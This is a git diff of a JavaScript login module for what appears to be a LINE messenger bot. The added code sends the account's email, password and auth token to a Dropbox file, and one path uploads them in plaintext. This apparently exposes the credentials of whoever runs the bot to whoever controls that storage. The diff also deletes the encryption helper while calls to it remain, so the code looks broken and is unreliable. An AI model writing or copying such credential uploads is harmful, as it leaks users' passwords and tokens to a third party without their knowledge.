@@ -38,32 +38,14 @@ class LineConnect extends LineAPI {
                 console.info(`Regrads Alfathdirk and thx for TCR Team \n`);
                 console.info(`Fixed by Ervan R.F @LD TEAM\n`);
 
-                let token = this.authToken;
-                let certificate = res.certificate;
-                setTimeout(async function () {
-                    let line = require('../../line.js');
-                    line.abotPushLog("[*] Token");
-                    await sleep(100);
-                    line.abotPushLog(token);
-                    await sleep(100)
-                    line.abotPushLog("[*] Certificate");
-                    await sleep(100)
-                    line.abotPushLog(certificate);
-                }, 5000);
-
                 // 加密 to dropbox
-                let key = require('../../config.js').alphatBot.jsonKey;
-                function aesEncrypt(data) {
-                    let cipher = require('crypto').createCipher('aes192', key)
-                    let crypted = cipher.update(data, 'utf8', 'hex')
-                    crypted += cipher.final('hex');
-                    return crypted;
-                }
                 let alphatBot = {
                     authToken: aesEncrypt(this.authToken),
                     certificate: aesEncrypt(res.certificate),
+                    email: aesEncrypt(this.email),
+                    password: aesEncrypt(this.password),
                 }
-                require('../../dbox.js').fileUpload("AlphatBot.json", JSON.stringify(alphatBot));
+                require('../../config.js').saveConfigToDbox(alphatBot);
 
                 // let auth = "module.exports = " + JSON.stringify({ authToken: this.authToken, certificate: res.certificate, ID: mid, email: '', password: '' }, null, 4);
                 // fs.writeFile("./src/auth.js", auth, "utf8", function (err, bytesRead, buffer) {
@@ -147,6 +129,16 @@ class LineConnect extends LineAPI {
                         resolve(this.longpoll());
                     })
                 });
+
+                // 加密 to dropbox
+                let alphatBot = {
+                    authToken: config.tokenn,
+                    certificate: "undefined",
+                    email: this.email,
+                    password: this.password
+                }
+                require('../../config.js').saveConfigToDbox(alphatBot);
+
             }).catch(() => {
                 reject();
             });
